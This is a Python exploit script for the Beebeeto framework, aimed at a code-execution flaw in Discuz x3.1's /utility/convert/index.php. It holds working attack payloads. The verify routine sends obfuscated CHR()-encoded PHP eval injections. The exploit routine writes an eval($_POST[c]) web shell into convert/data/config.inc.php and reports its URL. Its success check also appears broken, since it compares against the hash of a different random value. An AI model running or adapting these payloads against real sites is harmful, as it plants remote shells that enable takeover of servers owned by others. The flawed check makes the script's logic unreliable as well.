#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import md5
import random
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0080',
            'name': 'Discuz x3.1 /utility/convert/index.php 代码执行漏洞 POC & Exploit',
            'author': 'foundu',
            'create_date': '2014-10-18',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Discuz',
            'vul_version': ['3.1'],
            'type': 'Code Execution',
            'tag': ['Discuz漏洞', '代码执行漏洞', '/utility/convert/index.php'],
            'desc': 'N/A',
            'references': ['http://sebug.net/vuldb/ssvid-62557',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        random_str=str(random.random())
        random_md5=md5.new(random_str).hexdigest()
        paths = ['/','/utility/']
        payload = ('a=config&source=d7.2_x2.0&submit=yes&newconfig%5Btarget%5D%5Bdbhost%5D=localhost&newconfig'
                    '%5Baaa%0D%0A%0D%0Aeval%28CHR(100).CHR(105).CHR(101).CHR(40).CHR(109).CHR(100).CHR(53).CHR(40).'
                    'CHR(51).CHR(49).CHR(52).CHR(49).CHR(53).CHR(57).CHR(50).CHR(54).CHR(49).CHR(51).CHR(41).CHR(41)'
                    '%29%3B%2F%2F%5D=localhost&newconfig%5Bsource%5D%5Bdbuser%5D=root&newconfig%5Bsource%5D%5Bdbpw%5D='
                    '&newconfig%5Bsource%5D%5Bdbname%5D=discuz&newconfig%5Bsource%5D%5Btablepre%5D=cdb_&newconfig%5B'
                    'source%5D%5Bdbcharset%5D=&newconfig%5Bsource%5D%5Bpconnect%5D=1&newconfig%5Btarget%5D%5Bdbhost%5D='
                    'localhost&newconfig%5Btarget%5D%5Bdbuser%5D=root&newconfig%5Btarget%5D%5Bdbpw%5D=&newconfig%5Btarget'
                    '%5D%5Bdbname%5D=discuzx&newconfig%5Btarget%5D%5Btablepre%5D=pre_&newconfig%5Btarget%5D%5Bdbcharset%5D='
                    '&newconfig%5Btarget%5D%5Bpconnect%5D=1&submit=%B1%A3%B4%E6%B7%FE%CE%F1%C6%F7%C9%E8%D6%C3')
        for path in paths:
            url = args['options']['target']
            request = urllib2.Request(url+path+'convert/index.php', payload)
            if args['options']['verbose']:
                print '[*] Request URL: ' + url + path + 'convert/index.php'
            try:
                content = urllib2.urlopen(request).read()
            except:
                continue
            if '86539a15c11e3da6c205fd7b56928135' in content:
                args['success'] = True
                args['poc_ret']['vul_url'] = url + path + 'convert/data/config.inc.php'
                return args
        args['success'] = False
        return args

    @classmethod
    def exploit(cls, args):
        random_str=str(random.random())
        random_md5=md5.new(random_str).hexdigest()
        paths = ['/','/utility/']
        random_md5 = md5.new(str(random.random())).hexdigest()
        payload = ('a=config&source=d7.2_x2.0&submit=yes&newconfig%5Btarget%5D%5Bdbhost%5D=localhost&newconfig'
                   '%5Baaa%0D%0A%0D%0Aeval%28CHR%28101%29.CHR%28118%29.CHR%2897%29.CHR%28108%29.CHR%2840%29.CHR'
                   '%2834%29.CHR%2836%29.CHR%2895%29.CHR%2880%29.CHR%2879%29.CHR%2883%29.CHR%2884%29.CHR%2891%29.'
                   'CHR%2899%29.CHR%2893%29.CHR%2859%29.CHR%2834%29.CHR%2841%29.CHR%2859%29%29%3B%2F%2F%5D=localhost'
                   '&newconfig%5Bsource%5D%5Bdbuser%5D=root&newconfig%5Bsource%5D%5Bdbpw%5D=&newconfig%5Bsource%5D%5B'
                   'dbname%5D=discuz&newconfig%5Bsource%5D%5Btablepre%5D=cdb_&newconfig%5Bsource%5D%5Bdbcharset%5D=&'
                   'newconfig%5Bsource%5D%5Bpconnect%5D=1&newconfig%5Btarget%5D%5Bdbhost%5D=localhost&newconfig%5Btarget'
                   '%5D%5Bdbuser%5D=root&newconfig%5Btarget%5D%5Bdbpw%5D=&newconfig%5Btarget%5D%5Bdbname%5D=discuzx&'
                   'newconfig%5Btarget%5D%5Btablepre%5D=pre_&newconfig%5Btarget%5D%5Bdbcharset%5D=&newconfig%5Btarget'
                   '%5D%5Bpconnect%5D=1&submit=%B1%A3%B4%E6%B7%FE%CE%F1%C6%F7%C9%E8%D6%C3')
        for path in paths:
            url = args['options']['target']
            if args['options']['verbose']:
                print '[*] Request URL: ' + url + path + 'convert/index.php'
            try:
                request1 = urllib2.Request(url+path+'convert/index.php', payload)
                response1 = urllib2.urlopen(request1)
                request2 = urllib2.Request(url+path+'convert/data/config.inc.php', "c=print(md5("+random_str+"));")
                content = urllib2.urlopen(request2).read()
            except:
                continue
            if random_md5 in content:
                args['success'] = True
                args['poc_ret']['ShellInfo'] = {}
                args['poc_ret']['ShellInfo']['URL'] = url+path+'convert/data/config.inc.php'
                args['poc_ret']['ShellInfo']['Content'] = 'eval("$_POST[c];");'
                return args
        args['success'] = False
        return args

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())